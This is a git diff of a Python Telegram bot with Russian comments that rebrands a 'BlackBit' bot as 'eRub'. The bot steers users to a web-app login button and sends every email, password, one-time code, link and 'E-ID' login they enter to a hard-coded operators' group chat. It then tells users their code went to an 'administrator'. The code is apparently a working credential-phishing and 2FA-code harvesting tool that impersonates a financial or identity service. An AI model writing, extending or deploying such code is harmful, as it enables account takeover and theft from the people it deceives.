@@ -8,8 +8,8 @@ from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-GROUP_CHAT_ID = -1004446670922  # ← ID ГРУППЫ BLACKBIT
+BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")  # ← ТОКЕН БЕРЁТСЯ ИЗ ПЕРЕМЕННОЙ
+GROUP_CHAT_ID = -1004446670922
 WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
 # ===============================================
 
@@ -18,18 +18,18 @@ logger = logging.getLogger(__name__)
 
 user_sessions = {}
 
-class BlackBitBot:
+class ErubBot:
     def __init__(self):
         self.app = Application.builder().token(BOT_TOKEN).build()
         self.app.add_handler(CommandHandler("start", self.start))
         self.app.add_handler(MessageHandler(filters.ALL, self.handle))
 
-    # ===== 1. /start =====
+    # ===== 1. /start с полным уведомлением =====
     async def start(self, update: Update, context):
         user = update.effective_user
         current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
 
-        # Уведомление в группу
+        # Красивое уведомление в группу
         await self.app.bot.send_message(
             chat_id=GROUP_CHAT_ID,
             text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
@@ -43,8 +43,8 @@ class BlackBitBot:
         # Приветствие пользователю
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
-            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение BlackBit.\n\n"
-            f"Если Вы ещё не зарегистрированы в BlackBit, выберите Вход через E-ID.",
+            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.\n\n"
+            f"Если Вы ещё не зарегистрированы в eRub, выберите Вход через E-ID.",
             reply_markup=ReplyKeyboardMarkup(
                 [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                 resize_keyboard=True
@@ -61,33 +61,34 @@ class BlackBitBot:
         user_id = msg.from_user.id
         text = msg.text
 
+        # Если сообщение из группы — игнорируем
         if chat_id == GROUP_CHAT_ID:
             return
 
-        # ---- Код ----
+        # ---- Если пользователь вводит код ----
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
                 GROUP_CHAT_ID,
-                text=f"📧 КОД: `{text}`",
+                f"📧 КОД: `{text}`",
                 parse_mode="Markdown"
             )
             user_sessions[user_id]['awaiting_code'] = False
             await msg.reply_text("✅ Код отправлен администратору!")
             return
 
-        # ---- Ссылка ----
+        # ---- Если пользователь вводит ссылку ----
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
                 GROUP_CHAT_ID,
-                text=f"🔗 ССЫЛКА: `{text}`",
+                f"🔗 ССЫЛКА: `{text}`",
                 parse_mode="Markdown"
             )
             user_sessions[user_id]['awaiting_link'] = False
             await msg.reply_text("✅ Ссылка отправлена администратору!")
             return
 
-        # ---- JSON от Mini App ----
-        if text and text.startswith('{') and text.endswith('}'):
+        # ---- Если это JSON от Mini App ----
+        if text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
                 email = data.get('email')
@@ -99,7 +100,7 @@ class BlackBitBot:
                 # ---- Обычный вход ----
                 if email and password and not code and not link and not eid_type:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                              f"👤 ID: `{user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -112,7 +113,7 @@ class BlackBitBot:
                 # ---- E-ID вход ----
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"🆔 E-ID ВХОД\n\n"
                              f"👤 ID: `{user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -125,7 +126,7 @@ class BlackBitBot:
                 # ---- Код ----
                 if code:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"📧 КОД: `{code}`",
                         parse_mode="Markdown"
                     )
@@ -135,7 +136,7 @@ class BlackBitBot:
                 # ---- Ссылка ----
                 if link:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"🔗 ССЫЛКА: `{link}`",
                         parse_mode="Markdown"
                     )
@@ -146,9 +147,9 @@ class BlackBitBot:
                 logger.error(f"Ошибка: {e}")
                 await msg.reply_text("❌ Ошибка обработки данных")
 
+        # ---- Если пользователь просто пишет текст ----
         else:
-            if text:
-                await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
+            await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
     # ===== 3. Запуск =====
     def run(self):
@@ -160,7 +161,7 @@ class BlackBitBot:
             pass
 
         print("=" * 50)
-        print("🚀 БОТ BLACKBIT ЗАПУЩЕН")
+        print("🚀 БОТ ЗАПУЩЕН")
         print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
         print("=" * 50)
 
@@ -168,5 +169,5 @@ class BlackBitBot:
 
 
 if __name__ == "__main__":
-    bot = BlackBitBot()
+    bot = ErubBot()
     bot.run()
